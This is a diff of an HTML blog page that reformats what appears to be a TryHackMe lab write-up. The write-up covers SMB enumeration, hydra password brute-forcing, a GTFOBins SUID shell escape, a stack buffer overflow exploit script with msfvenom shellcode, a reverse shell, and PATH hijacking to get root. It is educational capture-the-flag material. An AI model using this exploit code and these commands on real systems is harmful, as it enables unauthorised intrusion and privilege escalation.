@@ -103,7 +103,7 @@
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "805"
+    "wordCount": "820"
   }]
   </script>
 
@@ -320,6 +320,45 @@
     </header>
     <section class="flex flex-col max-w-full mt-0 prose lg:flex-row dark:prose-invert">
       
+        <div class="order-first px-0 lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8 lg:order-last">
+          <div class="ltr:pl-5 rtl:pr-5 toc lg:sticky lg:top-10 print:hidden">
+            <details open class="mt-0 overflow-hidden rounded-lg rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 lg:mt-3">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 text-neutral-800 dark:text-neutral-100 lg:hidden bg-neutral-100 dark:bg-neutral-700"
+  >
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted ltr:border-l rtl:border-r rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 border-neutral-300 dark:border-neutral-600"
+  >
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#initial-foothold">Initial Foothold</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation-1-suid-binary">Privilege escalation #1: SUID binary</a></li>
+    <li><a href="#privilege-escalation-2-buffer-overflow">Privilege escalation #2: Buffer Overflow</a>
+      <ul>
+        <li><a href="#fuzzing-the-binary-file-and-finding-the-offset">Fuzzing the binary file and finding the offset</a></li>
+        <li><a href="#overwriting-the-rbp">Overwriting the RBP</a></li>
+        <li><a href="#examining-the-stack">Examining the stack</a></li>
+      </ul>
+    </li>
+    <li><a href="#creating-the-final-exploit">Creating the final exploit</a>
+      <ul>
+        <li><a href="#privilege-escalation-3-path-variable-manipulation">Privilege escalation #3: Path Variable Manipulation</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+          </div>
+        </div>
+      
       <div class="min-w-0 min-h-0 max-w-prose">
         <p>
 
@@ -335,8 +374,10 @@
   
 
 </p>
+<blockquote>
 <p>Exploit an SUID bit file, use GNU debugger to take advantage of a buffer overflow and gain root access by PATH manipulation.</p>
-<p><strong>Enumeration</strong></p>
+</blockquote>
+<h2 id="enumeration" class="relative group">Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#enumeration" aria-label="Anchor">#</a></span></h2>
 <p>Started off by running rustscan to discover open ports. We end up with port 22,139,445</p>
 <p>
 
@@ -353,9 +394,9 @@
 
 </p>
 <p>Port 139 and 445 are NBT and SMB services which we can enumerate with enum4linux</p>
-<p><a href="https://book.hacktricks.xyz/pentesting/pentesting-smb">139,445 - Pentesting SMB</a>
-<code>enum4linux -A &amp;lt;IP&amp;gt;</code>
-
+<p><a href="https://book.hacktricks.xyz/pentesting/pentesting-smb">139,445 - Pentesting SMB</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">enum4linux -A &lt;IP&gt;
+</code></pre></div><p>
 
 
 
@@ -384,7 +425,7 @@
   
 
 </p>
-<p><strong>Initial Foothold</strong></p>
+<h3 id="initial-foothold" class="relative group">Initial Foothold <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#initial-foothold" aria-label="Anchor">#</a></span></h3>
 <p>Running hydra against the username tryhackme and the rockyout.txt password list gives us the password to the ssh login</p>
 <p>
 
@@ -401,10 +442,10 @@
 
 </p>
 <p>We can now login and exploit the binaries</p>
-<p><strong>Privilege escalation #1: SUID binary</strong></p>
-<p>We can begin by locating a binary with SUID bit set.
-<code>find / -perm -u=s -type f 2&amp;gt;/dev/null</code>
-
+<h2 id="privilege-escalation-1-suid-binary" class="relative group">Privilege escalation #1: SUID binary <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#privilege-escalation-1-suid-binary" aria-label="Anchor">#</a></span></h2>
+<p>We can begin by locating a binary with SUID bit set.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
+</code></pre></div><p>
 
 
 
@@ -420,8 +461,9 @@
 </p>
 <p>The /usr/bin/find can be exploited to execute commands as the des user</p>
 <p><a href="https://gtfobins.github.io/gtfobins/find/#suid">find | GTFOBins</a></p>
-<p>Using the GTFOBins we obtain the command <code>   /usr/bin/find . -exec /bin/sh -p \; -quit</code></p>
-<p>Execute it to obtain a shell with an effective user id of that of des. Navigate to /home/des to obtain his flag</p>
+<p>Using the GTFOBins we obtain the command</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/usr/bin/find . -exec /bin/sh -p <span class="se">\;</span> -quit
+</code></pre></div><p>Execute it to obtain a shell with an effective user id of that of des. Navigate to /home/des to obtain his flag</p>
 <p>
 
 
@@ -436,7 +478,7 @@
   
 
 </p>
-<p><strong>Privilege escalation #2: Buffer Overflow</strong></p>
+<h2 id="privilege-escalation-2-buffer-overflow" class="relative group">Privilege escalation #2: Buffer Overflow <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#privilege-escalation-2-buffer-overflow" aria-label="Anchor">#</a></span></h2>
 <p>
 
 
@@ -482,7 +524,7 @@
   
 
 </p>
-<p><strong>Fuzzing the binary file and finding the offset</strong></p>
+<h3 id="fuzzing-the-binary-file-and-finding-the-offset" class="relative group">Fuzzing the binary file and finding the offset <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#fuzzing-the-binary-file-and-finding-the-offset" aria-label="Anchor">#</a></span></h3>
 <p>We can generate a bunch of As and try figure out what length of As crash the binary</p>
 <p>
 
@@ -558,7 +600,7 @@
   
 
 </p>
-<p><strong>Overwriting the RBP</strong></p>
+<h3 id="overwriting-the-rbp" class="relative group">Overwriting the RBP <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#overwriting-the-rbp" aria-label="Anchor">#</a></span></h3>
 <p>We can confirm we have control over the RBP by trying to overwrite it. Generate a payload of 608 As + 8Bs</p>
 <p>
 
@@ -575,7 +617,7 @@
 
 </p>
 <p>The rbp is overwritten with the 8Bs.</p>
-<p><strong>Examining the stack</strong></p>
+<h3 id="examining-the-stack" class="relative group">Examining the stack <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#examining-the-stack" aria-label="Anchor">#</a></span></h3>
 <p>We now need to examine the stack further so we can find the starting address of the buffer. The command below prints 100 bytes from the top of the stack
 <code>x/100x $rsp</code>
 
@@ -593,8 +635,8 @@
 
 </p>
 <p>The command below gets us the start of the buffer</p>
-<p><code>x/100x $rsp-700</code></p>
-<p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">x/100x <span class="nv">$rsp</span>-700
+</code></pre></div><p>
 
 
 
@@ -609,7 +651,7 @@
 
 </p>
 <p>We can note down an address close to the start of the buffer, we will use this as the value of the rip while creating our final exploit</p>
-<p><strong>Creating the final exploit</strong></p>
+<h2 id="creating-the-final-exploit" class="relative group">Creating the final exploit <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#creating-the-final-exploit" aria-label="Anchor">#</a></span></h2>
 <p>We intially found our offset to be <strong>608 bytes</strong>, which means that if we write past <strong>608 bytes</strong> eg <strong>608 +8 = 616 bytes</strong> , we will overwrite the base pointer in the stack. Note that the return address lies just above it, hence <strong>616+8 bytes</strong> are required to overwrite the saved return address.</p>
 <p>Let us create a shellcode which we use to spawn a shell using <strong>msfvenom</strong></p>
 <p>
@@ -626,9 +668,36 @@
   
 
 </p>
-<p>Putting all these into a python script
-<code>from struct import pack``payload_len = 616   nop = b&amp;#34;\x90&amp;#34;*200   new_rip = pack(&amp;#34;&amp;lt;Q&amp;#34;,0x7fffffffe2d4) #selected randomly near the start of the stack``buf =  b&amp;#34;&amp;#34;   buf += b&amp;#34;\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05&amp;#34;   buf += b&amp;#34;\xef\xff\xff\xff\x48\xbb\x32\xa3\x67\xe0\x79\x51\x8b&amp;#34;   buf += b&amp;#34;\x33\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&amp;#34;   buf += b&amp;#34;\x58\x8a\x3f\x79\x13\x53\xd4\x59\x33\xfd\x68\xe5\x31&amp;#34;   buf += b&amp;#34;\xc6\xc3\x8a\x30\xa3\x76\xbc\x73\x53\xa2\x92\x63\xeb&amp;#34;   buf += b&amp;#34;\xee\x06\x13\x41\xd1\x59\x18\xfb\x68\xe5\x13\x52\xd5&amp;#34;   buf += b&amp;#34;\x7b\xcd\x6d\x0d\xc1\x21\x5e\x8e\x46\xc4\xc9\x5c\xb8&amp;#34;   buf += b&amp;#34;\xe0\x19\x30\x1c\x50\xca\x09\xcf\x0a\x39\x8b\x60\x7a&amp;#34;   buf += b&amp;#34;\x2a\x80\xb2\x2e\x19\x02\xd5\x3d\xa6\x67\xe0\x79\x51&amp;#34;   buf += b&amp;#34;\x8b\x33&amp;#34;``shellcode = buf``shellcode_len = len(shellcode)   nop_len = len(nop)   padding = b&amp;#34;A&amp;#34;*(payload_len-shellcode_len-nop_len)``payload = [   nop,   shellcode,   padding,   new_rip   ]``payload = b&amp;#34;&amp;#34;.join(payload)   print(payload)</code></p>
-<p><em>The nop_sled is used to increase our chances of hitting the shellcode hence providing some stability to the exploit. The struct module ensures we obey little endian format</em></p>
+<p>Putting all these into a python script</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+<span class="n">payload_len</span> <span class="o">=</span> <span class="mi">616</span>
+<span class="n">nop</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">200</span>
+<span class="n">new_rip</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;Q&#34;</span><span class="p">,</span><span class="mh">0x7fffffffe2d4</span><span class="p">)</span> <span class="c1">#selected randomly near the start of the stack</span>
+<span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xef\xff\xff\xff\x48\xbb\x32\xa3\x67\xe0\x79\x51\x8b</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x33\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x58\x8a\x3f\x79\x13\x53\xd4\x59\x33\xfd\x68\xe5\x31</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc6\xc3\x8a\x30\xa3\x76\xbc\x73\x53\xa2\x92\x63\xeb</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xee\x06\x13\x41\xd1\x59\x18\xfb\x68\xe5\x13\x52\xd5</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7b\xcd\x6d\x0d\xc1\x21\x5e\x8e\x46\xc4\xc9\x5c\xb8</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xe0\x19\x30\x1c\x50\xca\x09\xcf\x0a\x39\x8b\x60\x7a</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x2a\x80\xb2\x2e\x19\x02\xd5\x3d\xa6\x67\xe0\x79\x51</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x8b\x33</span><span class="s2">&#34;</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">buf</span>
+<span class="n">shellcode_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+<span class="n">nop_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">nop</span><span class="p">)</span>
+<span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="n">payload_len</span><span class="o">-</span><span class="n">shellcode_len</span><span class="o">-</span><span class="n">nop_len</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="p">[</span>
+ <span class="n">nop</span><span class="p">,</span>
+ <span class="n">shellcode</span><span class="p">,</span>
+ <span class="n">padding</span><span class="p">,</span>
+ <span class="n">new_rip</span>
+<span class="p">]</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
+
+</code></pre></div><p><em>The nop_sled is used to increase our chances of hitting the shellcode hence providing some stability to the exploit. The struct module ensures we obey little endian format</em></p>
 <p>Start a meterpreter shell or a nc one listening on port 4444</p>
 <p>
 
@@ -645,8 +714,8 @@
 
 </p>
 <p>We get a reverse shell as kel user :) Get the flag and credentials to ssh as kel</p>
-<p><strong>Privilege escalation #3: Path Variable Manipulation</strong></p>
-<p>“PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored”</p>
+<h3 id="privilege-escalation-3-path-variable-manipulation" class="relative group">Privilege escalation #3: Path Variable Manipulation <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#privilege-escalation-3-path-variable-manipulation" aria-label="Anchor">#</a></span></h3>
+<p>PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored</p>
 <p>
 
 
@@ -661,11 +730,21 @@
   
 
 </p>
-<p>the exe.c file on user kel’s home directory shows that we are calling the ps system command. The program will search the ps command in the directories of the PATH variable. We can print out the PATH variables for the kel user as follows
-<code>kel@THM_exploit:~$ echo $PATH   /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin   kel@THM_exploit:~$</code></p>
-<p>We can stage our attack as follows - Create our own ps file that spawns a shell and add it to the beginning of $PATH. So when we run the exec binary, we get a shell as root</p>
-<p><code>kel@THM_exploit:~$ cd /tmp   kel@THM_exploit:/tmp$ echo “/bin/bash” &amp;gt; ps   kel@THM_exploit:/tmp$ chmod 777 ps   kel@THM_exploit:/tmp$ echo $PATH   /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin   kel@THM_exploit:/tmp$ export PATH=/tmp:$PATH   kel@THM_exploit:/tmp$ cd   kel@THM_exploit:~$ ./exe    root@THM_exploit:~#</code></p>
-<p>We get root !</p>
+<p>the exe.c file on user kel’s home directory shows that we are calling the ps system command. The program will search the ps command in the directories of the PATH variable. We can print out the PATH variables for the kel user as follows</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kel@THM_exploit:~$ <span class="nb">echo</span> <span class="nv">$PATH</span>  
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin  
+kel@THM_exploit:~$
+</code></pre></div><p>We can stage our attack as follows - Create our own ps file that spawns a shell and add it to the beginning of $PATH. So when we run the exec binary, we get a shell as root</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kel@THM_exploit:~$ <span class="nb">cd</span> /tmp  
+kel@THM_exploit:/tmp$ <span class="nb">echo</span> “/bin/bash” <span class="p">&amp;</span>gt<span class="p">;</span> ps  
+kel@THM_exploit:/tmp$ chmod <span class="m">777</span> ps  
+kel@THM_exploit:/tmp$ <span class="nb">echo</span> <span class="nv">$PATH</span>  
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin  
+kel@THM_exploit:/tmp$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>  
+kel@THM_exploit:/tmp$ <span class="nb">cd</span>  
+kel@THM_exploit:~$ ./exe   
+root@THM_exploit:~#<span class="sb">`</span>
+</code></pre></div><p>We get root !</p>
 
       </div>
     </section>
